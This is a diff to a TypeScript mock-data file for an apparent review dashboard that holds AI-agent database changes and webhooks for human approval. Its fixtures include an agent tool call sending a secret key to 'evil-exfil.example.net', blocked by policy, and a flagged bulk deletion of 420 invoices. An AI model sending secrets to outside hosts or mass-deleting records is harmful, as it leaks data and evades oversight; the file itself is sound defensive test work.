@@ -11,17 +11,67 @@
  */
 
 import type {
+  Invoice,
+  Mutation,
   HealthResponse,
   SessionListResponse,
   SessionManifest,
 } from "./types";
+
+const BULK_OPERATION_ID = "22222222-2222-4222-a222-222222222222";
+const FIXED_OVERDUE_INVOICES: Record<string, Invoice> = {
+  "0001": { id: "INV-0001", customer_name: "Northwind Logistics", customer_email: "ap@northwind.example.com", amount_cents: 145000, currency: "USD", status: "OVERDUE", due_date: "2026-10-15", notes: "Net 30", version: 1, created_at: "2026-09-15T10:00:00Z", updated_at: "2026-09-15T10:00:00Z" },
+  "0002": { id: "INV-0002", customer_name: "Fabrikam Supplies", customer_email: "accounts@fabrikam.example.com", amount_cents: 32050, currency: "USD", status: "OVERDUE", due_date: "2026-10-18", notes: null, version: 1, created_at: "2026-09-18T09:30:00Z", updated_at: "2026-09-18T09:30:00Z" },
+  "0042": { id: "INV-0042", customer_name: "Contoso Retail", customer_email: "billing@contoso.example.com", amount_cents: 89000, currency: "USD", status: "OVERDUE", due_date: "2026-10-20", notes: null, version: 1, created_at: "2026-09-20T08:00:00Z", updated_at: "2026-09-20T08:00:00Z" },
+};
+
+function seedInvoice(n: number): Invoice {
+  const number = String(n).padStart(4, "0");
+  const fixed = FIXED_OVERDUE_INVOICES[number];
+  if (fixed) return fixed;
+  const day = String((n % 28) + 1).padStart(2, "0");
+  const timestamp = `2026-09-${day}T10:00:00Z`;
+  return {
+    id: `INV-${number}`,
+    customer_name: `Customer ${number}`,
+    customer_email: `ap${number}@customer${number}.example.com`,
+    amount_cents: 10000 + n * 137,
+    currency: "USD",
+    status: "OVERDUE",
+    due_date: `2026-10-${day}`,
+    notes: null,
+    version: 1,
+    created_at: timestamp,
+    updated_at: timestamp,
+  };
+}
+
+function mockBulkDeleteMutations(): Mutation[] {
+  return Array.from({ length: 420 }, (_, index) => {
+    const n = index + 1;
+    return {
+      mutation_id: `10000000-0000-4000-8000-${String(n).padStart(12, "0")}`,
+      operation_id: BULK_OPERATION_ID,
+      tool_name: "bulk_delete_invoices",
+      entity_type: "invoice",
+      entity_id: `INV-${String(n).padStart(4, "0")}`,
+      mutation_type: "DELETE",
+      before: seedInvoice(n),
+      after: null,
+      changed_fields: [],
+      baseline_version: 1,
+      timestamp: "2026-11-28T06:15:00Z",
+      policy_decision: "REQUIRE_APPROVAL",
+    };
+  });
+}
 
 export const MOCK_HEALTH: HealthResponse = {
   status: "ok",
   prod_db_connected: true,
   meta_db_connected: true,
   prod_invoice_count: 500,
-  active_sessions: 2,
+  active_sessions: 0,
   contracts_loaded: true,
   timestamp: "2026-11-28T08:00:00Z",
 };
@@ -153,28 +203,28 @@ const MOCK_MANIFESTS: Record<string, SessionManifest> = {
           mutation_type: "UPDATE",
           before: {
             id: "INV-0042",
-            customer_name: "Northwind Logistics",
-            customer_email: "ap@northwind.example.com",
-            amount_cents: 145000,
+            customer_name: "Contoso Retail",
+            customer_email: "billing@contoso.example.com",
+            amount_cents: 89000,
             currency: "USD",
             status: "OVERDUE",
-            due_date: "2026-10-15",
-            notes: "Net 30",
+            due_date: "2026-10-20",
+            notes: null,
             version: 1,
-            created_at: "2026-09-15T10:00:00Z",
-            updated_at: "2026-09-15T10:00:00Z",
+            created_at: "2026-09-20T08:00:00Z",
+            updated_at: "2026-09-20T08:00:00Z",
           },
           after: {
             id: "INV-0042",
-            customer_name: "Northwind Logistics",
-            customer_email: "ap@northwind.example.com",
-            amount_cents: 145000,
+            customer_name: "Contoso Retail",
+            customer_email: "billing@contoso.example.com",
+            amount_cents: 89000,
             currency: "USD",
             status: "PAID",
-            due_date: "2026-10-15",
-            notes: "Net 30",
+            due_date: "2026-10-20",
+            notes: null,
             version: 2,
-            created_at: "2026-09-15T10:00:00Z",
+            created_at: "2026-09-20T08:00:00Z",
             updated_at: "2026-11-28T07:44:00Z",
           },
           changed_fields: ["status"],
@@ -187,15 +237,40 @@ const MOCK_MANIFESTS: Record<string, SessionManifest> = {
     },
     staged_webhooks: [
       {
-        webhook_id: "aabb1122-aabb-4112-aabb-aabb11223344",
+        webhook_id: "4c7e1a9d-0f5b-4d23-b68e-a1d5f9c3e072",
+        operation_id: "a2f6d0b4-9c3e-4851-87d1-e5b9c3a1f7d8",
         status: "STAGED",
-        url: "https://hooks.allowlisted.example.com/notify",
-        event_type: "invoice.paid",
-        payload: { invoice_id: "INV-0042" },
+        url: "https://hooks.airlock.internal/billing-events",
+        event_type: "invoice.updated",
+        payload: { invoice_id: "INV-0042", status: "PAID" },
+        staged_at: "2026-11-28T07:45:00Z",
       },
     ],
     policy_violations: [],
-    tool_execution_history: [],
+    tool_execution_history: [
+      {
+        operation_id: "9a1c5e7d-2b4f-4d86-a3c1-7e0f5b2d9c48",
+        tool_name: "update_invoice",
+        arguments: { invoice_id: "INV-0042", status: "PAID" },
+        read_only: false,
+        status: "SUCCESS",
+        tool_decision: "ALLOW",
+        mutations_recorded: 1,
+        error_code: null,
+        executed_at: "2026-11-28T07:44:00Z",
+      },
+      {
+        operation_id: "a2f6d0b4-9c3e-4851-87d1-e5b9c3a1f7d8",
+        tool_name: "stage_webhook",
+        arguments: { url: "https://hooks.airlock.internal/billing-events", event_type: "invoice.updated", payload: { invoice_id: "INV-0042", status: "PAID" } },
+        read_only: false,
+        status: "SUCCESS",
+        tool_decision: "ALLOW",
+        mutations_recorded: 0,
+        error_code: null,
+        executed_at: "2026-11-28T07:45:00Z",
+      },
+    ],
     finalization_result: null,
   },
 
@@ -226,50 +301,36 @@ const MOCK_MANIFESTS: Record<string, SessionManifest> = {
     mutations: {
       inserted: [],
       updated: [],
-      deleted: [
-        {
-          mutation_id: "11111111-1111-4111-a111-111111111111",
-          operation_id: "22222222-2222-4222-a222-222222222222",
-          tool_name: "bulk_delete_invoices",
-          entity_type: "invoice",
-          entity_id: "INV-0001",
-          mutation_type: "DELETE",
-          before: {
-            id: "INV-0001",
-            customer_name: "Northwind Logistics",
-            customer_email: "ap@northwind.example.com",
-            amount_cents: 145000,
-            currency: "USD",
-            status: "OVERDUE",
-            due_date: "2026-10-15",
-            notes: "Net 30",
-            version: 1,
-            created_at: "2026-09-15T10:00:00Z",
-            updated_at: "2026-09-15T10:00:00Z",
-          },
-          after: null,
-          changed_fields: [],
-          baseline_version: 1,
-          timestamp: "2026-11-28T06:15:00Z",
-          policy_decision: "REQUIRE_APPROVAL",
-        },
-      ],
+      deleted: mockBulkDeleteMutations(),
     },
     staged_webhooks: [],
     policy_violations: [
       {
-        violation_id: "33333333-3333-4333-a333-333333333333",
         policy_id: "POL-001",
         policy_name: "Bulk Deletion",
+        severity: "HIGH",
         decision: "REQUIRE_APPROVAL",
         effect_scope: "SESSION",
-        severity: "HIGH",
+        stage: "SESSION_COMPLETE",
+        operation_id: null,
         explanation: "420 of 500 invoices deleted (84%). Threshold: >80%.",
-        operation_id: "22222222-2222-4222-a222-222222222222",
-        entity_id: null,
+        affected_record_count: 420,
+        timestamp: "2026-11-28T06:30:00Z",
       },
     ],
-    tool_execution_history: [],
+    tool_execution_history: [
+      {
+        operation_id: BULK_OPERATION_ID,
+        tool_name: "bulk_delete_invoices",
+        arguments: { status: "OVERDUE", reason: "Purge overdue invoices" },
+        read_only: false,
+        status: "SUCCESS",
+        tool_decision: "ALLOW",
+        mutations_recorded: 420,
+        error_code: null,
+        executed_at: "2026-11-28T06:15:00Z",
+      },
+    ],
     finalization_result: null,
   },
 
@@ -301,37 +362,53 @@ const MOCK_MANIFESTS: Record<string, SessionManifest> = {
     staged_webhooks: [
       {
         webhook_id: "cccccccc-cccc-4ccc-accc-cccccccccccc",
+        operation_id: "55555555-5555-4555-a555-555555555555",
         status: "BLOCKED",
-        url: "[REDACTED]",
+        url: "https://evil-exfil.example.net/collect",
         event_type: "data.export",
         payload: { key: "[REDACTED]" },
+        staged_at: "2026-11-27T22:05:00Z",
       },
     ],
     policy_violations: [
       {
-        violation_id: "44444444-4444-4444-a444-444444444444",
         policy_id: "POL-003",
         policy_name: "Secret in Webhook",
+        severity: "CRITICAL",
         decision: "BLOCK",
         effect_scope: "SESSION",
-        severity: "CRITICAL",
-        explanation: "Secret marker detected in webhook payload.",
+        stage: "TOOL_EXECUTE",
         operation_id: "55555555-5555-4555-a555-555555555555",
-        entity_id: null,
+        explanation: "Secret marker detected in webhook payload.",
+        affected_record_count: null,
+        timestamp: "2026-11-27T22:05:00Z",
       },
       {
-        violation_id: "66666666-6666-4666-a666-666666666666",
         policy_id: "POL-004",
         policy_name: "Webhook Destination",
+        severity: "CRITICAL",
         decision: "BLOCK",
         effect_scope: "SESSION",
-        severity: "CRITICAL",
-        explanation: "Webhook destination not in allowed domain list.",
+        stage: "TOOL_EXECUTE",
         operation_id: "55555555-5555-4555-a555-555555555555",
-        entity_id: null,
+        explanation: "Webhook destination not in allowed domain list.",
+        affected_record_count: null,
+        timestamp: "2026-11-27T22:05:00Z",
       },
     ],
-    tool_execution_history: [],
+    tool_execution_history: [
+      {
+        operation_id: "55555555-5555-4555-a555-555555555555",
+        tool_name: "stage_webhook",
+        arguments: { url: "https://evil-exfil.example.net/collect", event_type: "data.export", payload: { key: "[REDACTED]" } },
+        read_only: false,
+        status: "BLOCKED",
+        tool_decision: "BLOCK",
+        mutations_recorded: 0,
+        error_code: "POLICY_BLOCK",
+        executed_at: "2026-11-27T22:05:00Z",
+      },
+    ],
     finalization_result: null,
   },
 
@@ -387,4 +464,50 @@ export function getMockSessionList(): SessionListResponse {
 
 export function getMockSessionDetail(sessionId: string): SessionManifest | null {
   return MOCK_MANIFESTS[sessionId] ?? null;
+}
+
+export function finalizeMockSession(
+  sessionId: string,
+  action: "COMMIT" | "ROLLBACK",
+  reviewer: string,
+  reason: string | null
+): SessionManifest | null {
+  const current = MOCK_MANIFESTS[sessionId];
+  if (!current) return null;
+
+  const timestamp = new Date().toISOString().replace(/\.\d{3}Z$/, "Z");
+  const committed = action === "COMMIT";
+  const updated: SessionManifest = {
+    ...current,
+    updated_at: timestamp,
+    finalized_at: timestamp,
+    execution_status: committed ? "COMMITTED" : "ROLLED_BACK",
+    human_review_status: committed ? "APPROVED" : "REJECTED",
+    finalization_result: {
+      action,
+      status: "SUCCESS",
+      actor: reviewer,
+      reason,
+      timestamp,
+      applied_counts: committed
+        ? {
+            inserted: current.mutation_counts.inserted,
+            updated: current.mutation_counts.updated,
+            deleted: current.mutation_counts.deleted,
+          }
+        : { inserted: 0, updated: 0, deleted: 0 },
+      conflict_details: null,
+      ledger_id: committed ? "1f4a7c9e-3d2b-4e86-a5c1-9b0d7e3f2a64" : null,
+      recovered: false,
+    },
+  };
+  MOCK_MANIFESTS[sessionId] = updated;
+
+  const summary = MOCK_SESSIONS_LIST.sessions.find((item) => item.session_id === sessionId);
+  if (summary) {
+    summary.updated_at = timestamp;
+    summary.execution_status = updated.execution_status;
+    summary.human_review_status = updated.human_review_status;
+  }
+  return updated;
 }
